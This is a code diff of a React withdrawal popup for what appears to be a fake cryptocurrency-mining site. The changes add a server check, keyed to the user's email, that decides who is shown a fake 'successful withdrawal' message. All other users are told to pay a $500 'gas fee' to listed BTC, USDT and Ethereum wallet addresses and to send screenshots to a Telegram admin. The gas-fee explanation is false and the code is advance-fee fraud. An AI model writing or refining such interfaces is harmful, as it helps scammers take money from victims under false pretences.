@@ -1,11 +1,15 @@
 import React, { useState, useEffect } from "react";
 import "./withdraw.css";
 import toast from "react-hot-toast";
+import { useHistory } from "react-router-dom";
+
 
 const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [storedWithdrawAmount, setStoredWithdrawAmount] = useState(0);
   const [success, setSuccess] = useState(false);
+  const history = useHistory();
+
 
   // Load stored withdrawal amount from local storage on component mount
   useEffect(() => {
@@ -15,6 +19,7 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
     }
   }, []);
 
+
   useEffect(() => {
     setTimeout(() => {
       if (success) {
@@ -22,10 +27,25 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
         onClose();
       }
     }, 6000);
-  }, [success]);
+  }, [success, onClose]);
 
-  const handleWithdraw = () => {
-    if (!withdrawAmount || isNaN(withdrawAmount) || parseFloat(withdrawAmount) <= 0) {
+  // toast.success(
+  //   <div>
+  //     ✅ Succesfull Withdrawal.
+  //     <br />
+  //     <span style={{ color: "darkgoldenrod", fontWeight: "bolder" }}>
+  //       ✅ ${parseFloat(withdrawAmount).toFixed(2)}&nbsp;
+  //     </span>
+  //     Withdrawn!.
+  //     <br />
+  //     ✅ Thank You!.
+  //     {/* Thank You. */}
+  //   </div>
+  // );
+
+  const handleWithdraw = async () => {
+
+    if (!withdrawAmount || Number.isNaN(withdrawAmount) || parseFloat(withdrawAmount) <= 0) {
       alert("Please enter a valid withdrawal amount.");
       return;
     }
@@ -38,15 +58,57 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
       alert("Your balance must be up to 3000.");
       return;
     }
-    // Withdraw successful, set success to true
-    setSuccess(true);
+
+
+    const userEmail = localStorage.getItem("userEmail");
+    if (!userEmail) {
+      alert("Please login before you can perform withdraw");
+      return;
+    }
+
+    const SERVER_BASE_URL = "https://exam-nodejs-main.onrender.com";
+    const CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT = `${SERVER_BASE_URL}/api/withdrawal/approval/`;
+
+    try {
+
+      const res = await fetch(`${CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT}${userEmail}`, { method: 'POST' });
+      const isApproved = (await res.json())?.withdrawal_status;
+
+      if (isApproved) {
+        console.log("[USER - APPROVED]");
+        toast.success(
+          <div>
+            ✅ Succesfull Withdrawal.
+            <br />
+            <span style={{ color: "darkgoldenrod", fontWeight: "bolder" }}>
+              ✅ ${parseFloat(withdrawAmount).toFixed(2)}&nbsp;
+            </span>
+            Withdrawn!.
+            <br />
+            ✅ Thank You!.
+            {/* Thank You. */}
+          </div>
+        );
+        setTimeout(() => window.location.reload(), 3000);
+        return;
+      }
+
+      // Withdraw successful, set success to true
+      setSuccess(true);
+      // console.log("[USER - NOT - APPROVED]");
+
+    } catch (error) {
+      toast.error("\n🚫 Network Error \n🚫Please Try Again.");
+      // setTimeout(() => window.location.reload(), 3000);
+    }
+
 
     // You can include logic here to send the withdrawal details to your backend
 
-    const btcAddress = "123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j";
-    const usdtTrc20Address = "TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy";
-    const ethereumAddress = "0x87cdd933bf000f96309215752696ae080f684ba9";
-    const link = "https://t.me/+79_1pk7cxb01NTRk";
+    // const btcAddress = "123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j";
+    // const usdtTrc20Address = "TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy";
+    // const ethereumAddress = "0x87cdd933bf000f96309215752696ae080f684ba9";
+    // const link = "https://t.me/startmininghere";
 
     // Display success message with withdrawal details
     // alert(
@@ -66,14 +128,29 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
             <span style={{ color: "green" }}> usdtTrc20Address = TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy</span>
             <span style={{ color: "orange" }}> ethereumAddress = 0x87cdd933bf000f96309215752696ae080f684ba9 </span>
             <span style={{ color: "red" }}>
-              All withdrawal is process by our team, Note: a fee of ($500) is to be paid to clear out your gas fee and
-              your upfront fee{" "}
+              (WITHDRAWALS WILL NEED A GAS FEE OF $500)
+              <br />
+
+              Gas fee are meant to be paid for the transaction that has been occurring during your mining ⛏ process,
+              this gas fee is use to settle the transactions when mining,
+              without it the mining server you mining from won’t allow you to withdraw the money you mined.
             </span>
-            <span style={{ color: "red" }}> you can keep mining until you are able to clear your gas fee</span>
-            <span style={{ color: "red" }}>Contact us with the link there to get more information from us!</span>
-            <a style={{ color: "blue" }} href="https://t.me/+79_1pk7cxb01NTRk">
-              https://t.me/+79_1pk7cxb01NTRk
-            </a>
+            <br />
+            <span style={{ color: "red" }}>
+
+              <span style={{ color: "green" }}> (How to confirm): </span>
+              Send payment screenshot to our admin 👩‍💼 on telegram to process your withdrawal approval.
+              <br />
+
+              <span style={{ color: "green" }}>(How to pay): </span>
+              Send payment to the provided wallet address provided to you on the page.
+              <br />
+
+            </span>
+
+            <span style={{ color: "green" }}>💬 Contact use to get started:
+              <a style={{ color: "blue" }} target="_blank" rel="noreferrer" href="https://t.me/startmininghere">(https://t.me/startmininghere)</a>
+            </span>
           </p>
         ) : (
           <>
@@ -95,9 +172,9 @@ const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
               Address:
             </label>
             <input style={{ color: "black", backgroundColor: "grey" }} type="text" id="withdrawAmount" />
-            <div style={{ color: "black" }}>Available Withdrawal Amount: ${storedWithdrawAmount.toFixed(2)}</div>
+            <div style={{ color: "black" }}>Available Withdrawal Amount: <span style={{ color: "darkgoldenrod" }}> ${storedWithdrawAmount.toFixed(2)} </span>  </div>
 
-            <button style={{ backgroundColor: "black", color: "orange" }} onClick={handleWithdraw}>
+            <button type="button" style={{ backgroundColor: "black", color: "orange" }} onClick={handleWithdraw}>
               Withdraw
             </button>
           </>
